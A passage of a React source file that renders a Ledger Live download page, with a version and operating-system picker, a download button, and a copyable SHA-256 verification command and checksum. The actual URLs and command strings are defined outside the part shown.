    // Open download link
    window.open(currentRelease.downloads[selectedOS], '_blank');
  };

  const currentRelease = releases.find(r => r.version === selectedVersion)!;
  const currentCommand = verificationCommands.find(cmd => cmd.os === selectedOS)!.getCommand(selectedVersion);

  const handleCopyHash = () => {
    navigator.clipboard.writeText(currentRelease.checksums[selectedOS]);
    setCopiedHash(true);
    setTimeout(() => setCopiedHash(false), 2000);
  };

  const handleCopyCommand = () => {
    navigator.clipboard.writeText(currentCommand);
    setCopiedCommand(true);
    setTimeout(() => setCopiedCommand(false), 2000);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <AnnouncementBar />
      <Header />
      <main className="max-w-4xl mx-auto px-4 py-12">
        <div className="mb-12">
          <h1 className="text-6xl tracking-tight text-gray-900 mb-4 font-['HMAlphaMono',Open sans,arial,sans-serif] uppercase">
            Ledger Live Download Signatures
          </h1>
          <p className="text-3xl text-black font-['HMAlphaMono',Open sans,arial,sans-serif] uppercase">
            Ledger Live releases
          </p>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-8">
          <div className="flex items-center justify-between mb-6">
            <div className="space-y-1">
              <h2 className="text-2xl text-black">Select Version</h2>
              <p className="text-sm text-gray-500">Choose the version you want to download</p>
            </div>
            <select
              value={selectedVersion}
              onChange={(e) => setSelectedVersion(e.target.value)}
              className="block rounded-md border-0 py-1.5 pl-3 pr-10 text-black ring-1 ring-inset ring-gray-300 focus:ring-2 focus:ring-black sm:text-sm sm:leading-6"
            >
              {releases.map((release) => (
                <option key={release.version} value={release.version}>
                  Version {release.version}
                </option>
              ))}
            </select>
          </div>

          <div className="grid md:grid-cols-3 gap-4">
            <button
              onClick={() => setSelectedOS('windows')}
              className={`flex items-center justify-center p-4 rounded-lg border ${
                selectedOS === 'windows'
                  ? 'border-black bg-gray-50 text-black'
                  : 'border-gray-200 hover:border-gray-300'
              }`}
            >
              <span className="text-sm font-medium">Windows</span>
            </button>
            <button
              onClick={() => setSelectedOS('mac')}
              className={`flex items-center justify-center p-4 rounded-lg border ${
                selectedOS === 'mac'
                  ? 'border-black bg-gray-50 text-black'
                  : 'border-gray-200 hover:border-gray-300'
              }`}
            >
              <span className="text-sm font-medium">macOS</span>
            </button>
            <button
              onClick={() => setSelectedOS('linux')}
              className={`flex items-center justify-center p-4 rounded-lg border ${
                selectedOS === 'linux'
                  ? 'border-black bg-gray-50 text-black'
                  : 'border-gray-200 hover:border-gray-300'
              }`}
            >
              <span className="text-sm font-medium">Linux</span>
            </button>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-8">
          <div className="flex items-center gap-3 mb-6">
            <Download className="w-5 h-5 text-black" />
            <h2 className="text-2xl text-black">Download</h2>
          </div>
          
          <div className="space-y-4">
            <div className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
              <div className="flex items-center gap-3">
                <CheckCircle className="w-5 h-5 text-black" />
                <div>
                  <p className="font-medium text-black">Version {currentRelease.version}</p>
                </div>
              </div>
              <button
                onClick={() => handleDownload(currentRelease.version, selectedOS)}
                className="inline-flex items-center justify-center rounded-md bg-black px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-gray-800 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-black"
              >
                Download
              </button>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
          <div className="flex items-center gap-3 mb-6">
            <FileTerminal className="w-5 h-5 text-black" />
            <h2 className="text-2xl text-black">Verify Download</h2>
          </div>

          <div className="space-y-4">
            <p className="text-gray-600 text-sm">
              To ensure the integrity and authenticity of your download, verify its SHA-256 checksum. This process helps confirm that the file hasn't been tampered with during download.
            </p>
            
            <div className="grid gap-6">
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <h3 className="text-sm font-medium text-black flex items-center gap-2">
                    <Command className="w-4 h-4" />
                    Verification Command
                  </h3>
                  <button
                    onClick={handleCopyCommand}
                    className="text-xs text-gray-500 hover:text-black flex items-center gap-1 transition-colors"
                  >
                    {copiedCommand ? (
                      <>
                        <Check className="w-3 h-3" />
                        Copied!
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3" />
                        Copy command
                      </>
                    )}
                  </button>
                </div>
                <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm text-gray-100">
                  {currentCommand}
                </div>
              </div>

              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <h3 className="text-sm font-medium text-black flex items-center gap-2">
                    <Terminal className="w-4 h-4" />
                    Expected SHA-256 Checksum
                  </h3>
                  <button
                    onClick={handleCopyHash}
                    className="text-xs text-gray-500 hover:text-black flex items-center gap-1 transition-colors"
                  >
                    {copiedHash ? (
                      <>
                        <Check className="w-3 h-3" />
                        Copied!
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3" />
                        Copy hash
                      </>
                    )}
                  </button>
                </div>
                <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm text-gray-100 break-all">
                  {currentRelease.checksums[selectedOS]}
                </div>
              </div>
            </div>

            <div className="rounded-lg border border-gray-200 divide-y divide-gray-200">
              <div className="p-4">
                <h3 className="text-sm font-medium text-black mb-2">How to verify your download</h3>
                <ol className="text-sm text-gray-600 space-y-2 list-decimal list-inside">
                  <li>Open a terminal or command prompt</li>
                  <li>Navigate to your download directory</li>
                  <li>Copy and run the verification command above</li>
                  <li>Compare the output with the expected checksum</li>
                  <li>If they match exactly, your download is verified!</li>
                </ol>
              </div>
              <div className="p-4">
                <h3 className="text-sm font-medium text-black mb-2">What if the checksums don't match?</h3>
                <p className="text-sm text-gray-600">
                  If the checksums don't match, your download might be corrupted or tampered with. Please try downloading the file again. If the problem persists, contact Ledger Support.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}

export default App
